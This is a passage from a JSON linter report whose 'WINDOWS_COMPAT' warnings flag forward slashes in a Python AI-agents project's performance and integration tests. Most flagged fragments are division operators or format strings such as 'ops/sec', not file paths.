        "warning": "Line 757: Forward slash in path - \"tests/intelligence/test_multi_domain_processing.py::TestPerformanceBenchmarks\"",
        "timestamp": "2025-09-05T17:30:42.214232"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 112: Forward slash in path - \"\n        while self.monitoring:\n            try:\n                # CPU and memory metrics\n                cpu_percent = self.process.cpu_percent()\n                memory_info = self.process.memory_info()\n                \n                # System-wide metrics\n                system_cpu = psutil.cpu_percent()\n                system_memory = psutil.virtual_memory()\n                \n                # I/O metrics\n                io_counters = self.process.io_counters()\n                \n                metric = {\n                    '",
        "timestamp": "2025-09-05T17:30:42.214647"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 129: Forward slash in path - ': memory_info.rss / 1024 / 1024,\n                    '",
        "timestamp": "2025-09-05T17:30:42.214661"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 171: Forward slash in path - \"\n        start_time = time.perf_counter()\n        \n        try:\n            # Simulate variable processing time based on complexity\n            processing_time = complexity * (0.1 + (hash(task_id) % 100) / 1000)\n            await asyncio.sleep(processing_time)\n            \n            # Simulate occasional failures\n            if (hash(task_id) % 1000) / 1000 < failure_rate:\n                raise Exception(f\"",
        "timestamp": "2025-09-05T17:30:42.214697"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 238: Forward slash in path - '/api/process'",
        "timestamp": "2025-09-05T17:30:42.214735"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 239: Forward slash in path - \"\n        start_time = time.perf_counter()\n        \n        try:\n            # Simulate API processing time\n            processing_time = 0.05 + (hash(request_id) % 100) / 2000  # 50-100ms\n            await asyncio.sleep(processing_time)\n            \n            end_time = time.perf_counter()\n            return {\n                '",
        "timestamp": "2025-09-05T17:30:42.214751"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 317: Forward slash in path - '],\n                total_operations=len(results),\n                success_rate=len(successful_results) / len(results),\n                average_response_time=statistics.mean(response_times) if response_times else 0,\n                median_response_time=statistics.median(response_times) if response_times else 0,\n                p95_response_time=statistics.quantiles(response_times, n=20)[18] if len(response_times) >= 20 else max(response_times) if response_times else 0,\n                p99_response_time=statistics.quantiles(response_times, n=100)[98] if len(response_times) >= 100 else max(response_times) if response_times else 0,\n                throughput_ops_per_second=len(successful_results) / total_duration,\n                cpu_usage_percent=0,  # Will be filled from resource monitor\n                memory_usage_mb=0,    # Will be filled from resource monitor\n                memory_peak_mb=0,     # Will be filled from resource monitor\n                disk_io_read_mb=0,\n                disk_io_write_mb=0,\n                network_io_sent_mb=0,\n                network_io_recv_mb=0,\n                errors=[str(r) for r in failed_results + exception_results],\n                execution_duration=total_duration\n            )\n            \n            # Performance assertions for small load\n            assert metrics.success_rate >= 0.95, f\"",
        "timestamp": "2025-09-05T17:30:42.214815"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 341: Forward slash in path - \"Small load test completed: {metrics.throughput_ops_per_second:.1f} ops/sec, {metrics.success_rate:.2%} success rate\"",
        "timestamp": "2025-09-05T17:30:42.214835"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 396: Forward slash in path - '],\n                total_operations=len(all_results),\n                success_rate=len(successful_results) / len(all_results),\n                average_response_time=statistics.mean(response_times) if response_times else 0,\n                median_response_time=statistics.median(response_times) if response_times else 0,\n                p95_response_time=statistics.quantiles(response_times, n=20)[18] if len(response_times) >= 20 else max(response_times) if response_times else 0,\n                p99_response_time=statistics.quantiles(response_times, n=100)[98] if len(response_times) >= 100 else max(response_times) if response_times else 0,\n                throughput_ops_per_second=len(successful_results) / total_duration,\n                cpu_usage_percent=0,\n                memory_usage_mb=0,\n                memory_peak_mb=0,\n                disk_io_read_mb=0,\n                disk_io_write_mb=0,\n                network_io_sent_mb=0,\n                network_io_recv_mb=0,\n                errors=[str(r) for r in failed_results],\n                execution_duration=total_duration\n            )\n            \n            # Performance assertions for high load\n            assert metrics.success_rate >= 0.90, f\"",
        "timestamp": "2025-09-05T17:30:42.214895"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 420: Forward slash in path - \"High load test completed: {metrics.throughput_ops_per_second:.1f} ops/sec, {metrics.success_rate:.2%} success rate\"",
        "timestamp": "2025-09-05T17:30:42.214919"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 477: Forward slash in path - ',\n                timestamp=datetime.now(),\n                concurrent_operations=tasks_per_second,\n                total_operations=len(all_results),\n                success_rate=len(successful_results) / len(all_results),\n                average_response_time=statistics.mean(response_times) if response_times else 0,\n                median_response_time=statistics.median(response_times) if response_times else 0,\n                p95_response_time=statistics.quantiles(response_times, n=20)[18] if len(response_times) >= 20 else max(response_times) if response_times else 0,\n                p99_response_time=statistics.quantiles(response_times, n=100)[98] if len(response_times) >= 100 else max(response_times) if response_times else 0,\n                throughput_ops_per_second=len(successful_results) / total_duration,\n                cpu_usage_percent=0,\n                memory_usage_mb=0,\n                memory_peak_mb=0,\n                disk_io_read_mb=0,\n                disk_io_write_mb=0,\n                network_io_sent_mb=0,\n                network_io_recv_mb=0,\n                errors=[str(r) for r in failed_results],\n                execution_duration=total_duration\n            )\n            \n            # Assertions for sustained load\n            assert metrics.success_rate >= 0.95, f\"",
        "timestamp": "2025-09-05T17:30:42.214980"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 502: Forward slash in path - \"Sustained load test completed: {metrics.throughput_ops_per_second:.1f} ops/sec over {total_duration:.1f}s\"",
        "timestamp": "2025-09-05T17:30:42.215006"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 556: Forward slash in path - ', 0) for r in successful_ops]\n        total_duration = end_time - start_time\n        \n        # Database performance assertions\n        success_rate = len(successful_ops) / len(results)\n        avg_latency = statistics.mean(durations) if durations else 0\n        throughput = len(successful_ops) / total_duration\n        \n        assert success_rate >= 0.99, f\"",
        "timestamp": "2025-09-05T17:30:42.215057"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 566: Forward slash in path - \"Database throughput too low: {throughput} ops/sec\"",
        "timestamp": "2025-09-05T17:30:42.215085"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 568: Forward slash in path - \"Database performance: {throughput:.1f} ops/sec, {avg_latency*1000:.1f}ms avg latency\"",
        "timestamp": "2025-09-05T17:30:42.215111"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 642: Forward slash in path - '/api/process'",
        "timestamp": "2025-09-05T17:30:42.215172"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 642: Forward slash in path - '/api/analyze'",
        "timestamp": "2025-09-05T17:30:42.215204"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 642: Forward slash in path - '/api/report'",
        "timestamp": "2025-09-05T17:30:42.215236"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 658: Forward slash in path - ', 0) for r in successful_requests]\n        total_duration = end_time - start_time\n        \n        # API performance assertions\n        success_rate = len(successful_requests) / len(results)\n        avg_response_time = statistics.mean(response_times) if response_times else 0\n        throughput = len(successful_requests) / total_duration\n        p95_response_time = statistics.quantiles(response_times, n=20)[18] if len(response_times) >= 20 else max(response_times) if response_times else 0\n        \n        assert success_rate >= 0.95, f\"",
        "timestamp": "2025-09-05T17:30:42.215279"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 670: Forward slash in path - \"API throughput too low: {throughput} req/sec\"",
        "timestamp": "2025-09-05T17:30:42.215312"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 672: Forward slash in path - \"API performance: {throughput:.1f} req/sec, {avg_response_time*1000:.1f}ms avg response\"",
        "timestamp": "2025-09-05T17:30:42.215343"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 681: Forward slash in path - \"\n        import gc\n        \n        # Force garbage collection before test\n        gc.collect()\n        \n        process = psutil.Process(os.getpid())\n        initial_memory = process.memory_info().rss / 1024 / 1024  # MB\n        \n        simulator = ConcurrentTaskSimulator()\n        memory_snapshots = []\n        \n        # Run tasks in batches and monitor memory\n        batch_size = 50\n        num_batches = 10\n        \n        for batch_num in range(num_batches):\n            # Execute batch of tasks\n            tasks = []\n            for i in range(batch_size):\n                task = simulator.simulate_agent_task(\n                    task_id=f\"",
        "timestamp": "2025-09-05T17:30:42.215386"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 702: Forward slash in path - \",\n                    complexity=0.7,\n                    failure_rate=0.01\n                )\n                tasks.append(task)\n            \n            batch_results = await asyncio.gather(*tasks, return_exceptions=True)\n            \n            # Take memory snapshot\n            current_memory = process.memory_info().rss / 1024 / 1024\n            memory_snapshots.append({\n                '",
        "timestamp": "2025-09-05T17:30:42.215424"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 730: Forward slash in path - \"\n        \n        # Check for memory leaks (memory should not grow linearly with tasks)\n        memory_growth_rate = memory_increase / (num_batches * batch_size)\n        assert memory_growth_rate < 0.1, f\"",
        "timestamp": "2025-09-05T17:30:42.215473"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 771: Forward slash in path - \",\n                complexity=0.5,\n                failure_rate=0.01\n            )\n            tasks.append(task)\n        \n        results_gc_enabled = await asyncio.gather(*tasks, return_exceptions=True)\n        time_gc_enabled = time.perf_counter() - start_time\n        \n        # Analyze garbage collection impact\n        performance_impact = (time_gc_enabled - time_gc_disabled) / time_gc_disabled\n        \n        # GC impact should be minimal (less than 20% performance difference)\n        assert abs(performance_impact) < 0.2, f\"",
        "timestamp": "2025-09-05T17:30:42.215538"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 841: Forward slash in path - ']) / len(normal_results)\n        failure_success_rate = len([r for r in failure_results if isinstance(r, dict) and r.get('",
        "timestamp": "2025-09-05T17:30:42.215594"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 842: Forward slash in path - ']) / len(failure_results)\n        recovery_success_rate = len([r for r in recovery_results if isinstance(r, dict) and r.get('",
        "timestamp": "2025-09-05T17:30:42.215623"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 843: Forward slash in path - ']) / len(recovery_results)\n        \n        # Recovery performance assertions\n        assert normal_success_rate >= 0.95, f\"",
        "timestamp": "2025-09-05T17:30:42.215653"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 848: Forward slash in path - \"\n        \n        # Recovery time should not be significantly worse than normal\n        recovery_slowdown = (recovery_time - normal_time) / normal_time\n        assert recovery_slowdown < 0.5, f\"",
        "timestamp": "2025-09-05T17:30:42.215686"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 878: Forward slash in path - \"  Throughput: {metrics.throughput_ops_per_second:.1f} ops/sec\"",
        "timestamp": "2025-09-05T17:30:42.215727"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 895: Forward slash in path - \"Average Throughput: {avg_throughput:.1f} operations/second\"",
        "timestamp": "2025-09-05T17:30:42.215765"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 901: Forward slash in path - \"✓ Small Load: >80 ops/sec, <500ms response, >95% success\"",
        "timestamp": "2025-09-05T17:30:42.215798"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 902: Forward slash in path - \"✓ Medium Load: >50 ops/sec, <1s response, >93% success\"",
        "timestamp": "2025-09-05T17:30:42.215828"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
        "warning": "Line 903: Forward slash in path - \"✓ High Load: >30 ops/sec, <2s P95 response, >90% success\"",
        "timestamp": "2025-09-05T17:30:42.215858"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\conftest.py",
        "warning": "Line 249: Forward slash in path - ': self.process.memory_info().rss / 1024 / 1024,\n            '",
        "timestamp": "2025-09-05T17:30:42.216237"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 64: Forward slash in path - 'tests/phase7/test_autonomous_orchestration.py'",
        "timestamp": "2025-09-05T17:30:42.216739"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 65: Forward slash in path - 'tests/phase7/test_performance.py'",
        "timestamp": "2025-09-05T17:30:42.216751"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 66: Forward slash in path - 'tests/phase7/test_security.py'",
        "timestamp": "2025-09-05T17:30:42.216758"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 67: Forward slash in path - 'tests/phase7/test_causal_reasoning.py'",
        "timestamp": "2025-09-05T17:30:42.216765"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 68: Forward slash in path - 'tests/phase7/test_self_modification.py'",
        "timestamp": "2025-09-05T17:30:42.216795"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 69: Forward slash in path - 'tests/phase7/test_integration.py'",
        "timestamp": "2025-09-05T17:30:42.216807"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 109: Forward slash in path - \")\n        \n        # Check system resources\n        memory_gb = psutil.virtual_memory().total / (1024**3)\n        cpu_count = psutil.cpu_count()\n        \n        logger.info(f\"",
        "timestamp": "2025-09-05T17:30:42.216835"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 124: Forward slash in path - ': psutil.virtual_memory().used / (1024**3),\n            '",
        "timestamp": "2025-09-05T17:30:42.216848"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 126: Forward slash in path - ').used / (1024**3)\n        }\n        \n    async def _check_dependencies(self) -> List[str]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.216857"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 192: Forward slash in path - \"    {suite_name}: {suite_result.passed_tests}/{suite_result.total_tests} passed ({suite_result.success_rate:.1%}) in {execution_time:.2f}s\"",
        "timestamp": "2025-09-05T17:30:42.216898"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 224: Forward slash in path - '\n            ]\n            \n            # Execute pytest\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE,\n                cwd=Path(__file__).parent.parent.parent\n            )\n            \n            stdout, stderr = await process.communicate()\n            \n            # Parse JSON report if available\n            report_path = Path(__file__).parent.parent.parent / '",
        "timestamp": "2025-09-05T17:30:42.216930"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 254: Forward slash in path - ', 0) / max(summary.get('",
        "timestamp": "2025-09-05T17:30:42.216951"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 256: Forward slash in path - ': self._extract_performance_metrics(report_data)\n                }\n            else:\n                # Fallback parsing from stdout/stderr\n                return self._parse_pytest_output(stdout.decode(), stderr.decode())\n                \n        except Exception as e:\n            logger.error(f\"",
        "timestamp": "2025-09-05T17:30:42.216967"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 347: Forward slash in path - ': passed / max(total, 1),\n            '",
        "timestamp": "2025-09-05T17:30:42.217030"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 354: Forward slash in path - \")\n        \n        # Calculate overall metrics\n        total_tests = sum(r.total_tests for r in self.results.values())\n        total_passed = sum(r.passed_tests for r in self.results.values())\n        total_failed = sum(r.failed_tests for r in self.results.values())\n        overall_success_rate = total_passed / max(total_tests, 1)\n        \n        # Check target achievements\n        target_achievements = await self._evaluate_target_achievements()\n        \n        # Collect critical issues\n        critical_issues = []\n        for result in self.results.values():\n            critical_issues.extend(result.critical_failures)\n        \n        # Generate recommendations\n        recommendations = await self._generate_recommendations(target_achievements, critical_issues)\n        \n        # Collect system metrics\n        self.system_metrics['",
        "timestamp": "2025-09-05T17:30:42.217059"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 375: Forward slash in path - ': psutil.virtual_memory().used / (1024**3),\n            '",
        "timestamp": "2025-09-05T17:30:42.217072"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 377: Forward slash in path - ').used / (1024**3),\n            '",
        "timestamp": "2025-09-05T17:30:42.217086"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 504: Forward slash in path - \"tests/phase7/validation_report_{timestamp}.json\"",
        "timestamp": "2025-09-05T17:30:42.217181"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 509: Forward slash in path - \"tests/phase7/validation_summary_{timestamp}.md\"",
        "timestamp": "2025-09-05T17:30:42.217200"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 589: Forward slash in path - \"   {status} {suite_name}: {result.passed_tests}/{result.total_tests} ({result.success_rate:.1%})\"",
        "timestamp": "2025-09-05T17:30:42.217302"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "warning": "Line 643: Forward slash in path - \"\\n{args.suite} Results: {result.passed_tests}/{result.total_tests} passed ({result.success_rate:.1%})\"",
        "timestamp": "2025-09-05T17:30:42.217351"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
        "warning": "Line 543: Forward slash in path - \"Only {scenarios_meeting_target}/5 scenarios met accuracy target\"",
        "timestamp": "2025-09-05T17:30:42.218808"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
        "warning": "Line 549: Forward slash in path - \"  Scenarios meeting target: {scenarios_meeting_target}/5\"",
        "timestamp": "2025-09-05T17:30:42.218835"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
        "warning": "Line 586: Forward slash in path - \"\n            \n            # Should show learning/improvement\n            accuracy_trend = np.polyfit(range(len(accuracy_over_time)), accuracy_over_time, 1)[0]\n            assert accuracy_trend >= -0.01, \"",
        "timestamp": "2025-09-05T17:30:42.218875"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
        "warning": "Line 594: Forward slash in path - \"N/A\"",
        "timestamp": "2025-09-05T17:30:42.218897"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
        "warning": "Line 661: Forward slash in path - \"\n        np.random.seed(789)\n        data_points = []\n        \n        for i in range(n_points):\n            # Simple streaming relationship that changes over time\n            time_factor = i / n_points\n            \n            x = np.random.normal(0, 1)\n            # Relationship strength changes over time\n            strength = 0.3 + 0.4 * time_factor\n            y = strength * x + np.random.normal(0, 0.2)\n            z = 0.5 * y + np.random.normal(0, 0.3)\n            \n            data_points.append({\n                '",
        "timestamp": "2025-09-05T17:30:42.218974"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Line 104: Forward slash in path - \"\n        total_tasks = self.success_count + self.failure_count\n        return self.success_count / total_tasks if total_tasks > 0 else 0.0\n\n\nclass ComplexBusinessScenario:\n    \"",
        "timestamp": "2025-09-05T17:30:42.219409"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Line 157: Forward slash in path - ', False)]\n        \n        total_tasks = len(self.tasks)\n        success_rate = len(successful_tasks) / total_tasks if total_tasks > 0 else 0.0\n        \n        # Check specific criteria\n        criteria_met = {}\n        overall_success = True\n        \n        if '",
        "timestamp": "2025-09-05T17:30:42.219465"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Line 176: Forward slash in path - ', 0) for t in successful_tasks) / len(successful_tasks) if successful_tasks else 0\n            criteria_met['",
        "timestamp": "2025-09-05T17:30:42.219491"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Line 278: Forward slash in path - ', False)]\n        success_rate = len(successful_tasks) / len(results)\n        \n        # Calculate quality metrics\n        avg_quality = sum(r.get('",
        "timestamp": "2025-09-05T17:30:42.219556"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Line 282: Forward slash in path - ', 0) for r in successful_tasks) / len(successful_tasks) if successful_tasks else 0\n        avg_execution_time = sum(r.get('",
        "timestamp": "2025-09-05T17:30:42.219568"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Line 283: Forward slash in path - ', 0) for r in results) / len(results)\n        complexity_handling = sum(r.get('",
        "timestamp": "2025-09-05T17:30:42.219579"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Line 284: Forward slash in path - ', 0) for r in results) / sum(r.get('",
        "timestamp": "2025-09-05T17:30:42.219589"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Line 382: Forward slash in path - ']}/{workflow_evaluation['",
        "timestamp": "2025-09-05T17:30:42.219662"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Line 436: Forward slash in path - '] for opt in optimizations_applied) / len(optimizations_applied) if optimizations_applied else 0\n        \n        print(f\"",
        "timestamp": "2025-09-05T17:30:42.219799"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Line 585: Forward slash in path - ')])\n        propagation_rate = agents_with_capability / len(agent_population)\n        \n        print(f\"",
        "timestamp": "2025-09-05T17:30:42.219893"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Line 589: Forward slash in path - \"  Agents with new capability: {agents_with_capability}/{len(agent_population)}\"",
        "timestamp": "2025-09-05T17:30:42.219910"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Line 596: Forward slash in path - ', 0) for r in propagation_results) / len(propagation_results)\n        \n        assert collective_improvement > 0.15, f\"",
        "timestamp": "2025-09-05T17:30:42.219932"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Line 628: Forward slash in path - '] / 0.10,\n            '",
        "timestamp": "2025-09-05T17:30:42.219965"
      },
      {
        "category": "WINDOWS_COMPAT",
